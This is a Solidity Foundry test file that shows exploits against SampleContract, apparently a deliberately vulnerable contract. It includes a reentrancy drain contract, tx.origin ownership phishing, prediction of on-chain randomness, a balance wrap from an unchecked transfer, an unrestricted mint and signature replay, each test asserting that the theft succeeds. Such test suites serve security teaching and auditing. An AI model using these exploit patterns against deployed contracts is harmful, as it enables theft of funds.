// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {SampleContract} from "../src/SampleContract.sol";

contract ReentrancyAttacker {
    SampleContract public bank;

    constructor(SampleContract bank_) {
        bank = bank_;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0) {
            bank.withdraw();
        }
    }
}

contract PhishingWallet {
    SampleContract public bank;

    constructor(SampleContract bank_) {
        bank = bank_;
    }

    function stealOwner(address newOwner) external {
        bank.changeOwner(newOwner);
    }
}

contract SampleContractTest is Test {
    SampleContract internal bank;
    address internal victim = makeAddr("victim");

    function setUp() public {
        vm.prank(victim, victim);
        bank = new SampleContract();
        bank.deposit{value: 10 ether}();
    }

    function test_ReentrancyDrainsBank() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(bank);
        attacker.attack{value: 1 ether}();

        assertEq(address(bank).balance, 0);
        assertGt(address(attacker).balance, 10 ether);
    }

    function test_AnyoneCanMint() public {
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        bank.mint(attacker, 1_000_000 ether);

        assertEq(bank.balances(attacker), 1_000_000 ether);
    }

    function test_TxOriginPhishingStealsOwnership() public {
        address thief = makeAddr("thief");
        PhishingWallet bait = new PhishingWallet(bank);

        vm.prank(victim, victim);
        bait.stealOwner(thief);

        assertEq(bank.owner(), thief);
    }

    function test_OnChainRandomnessIsPredictable() public {
        uint256 secret = uint256(keccak256(abi.encodePacked(block.prevrandao, block.timestamp, address(bank))));

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.prank(attacker);
        bank.play{value: 0.1 ether}(secret);

        assertEq(address(bank).balance, 0);
        assertEq(attacker.balance, 11 ether);
    }

    function test_UncheckedTransferWrapsBalance() public {
        address attacker = makeAddr("attacker");
        address sink = makeAddr("sink");

        vm.prank(attacker);
        bank.transfer(sink, 1);

        assertEq(bank.balances(attacker), type(uint256).max);
        assertEq(bank.balances(sink), 1);
    }

    function test_SignatureCanBeReplayed() public {
        uint256 fromKey = 0xA11CE;
        address from = vm.addr(fromKey);
        address buyer = makeAddr("buyer");

        vm.deal(from, 2 ether);
        vm.prank(from);
        bank.deposit{value: 2 ether}();

        bytes32 digest = keccak256(abi.encodePacked(from, uint256(1 ether)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(fromKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        vm.startPrank(buyer);
        bank.claimWithSignature(from, 1 ether, signature);
        bank.claimWithSignature(from, 1 ether, signature);
        vm.stopPrank();

        assertEq(bank.balances(from), 0);
        assertEq(bank.balances(buyer), 2 ether);
    }
}
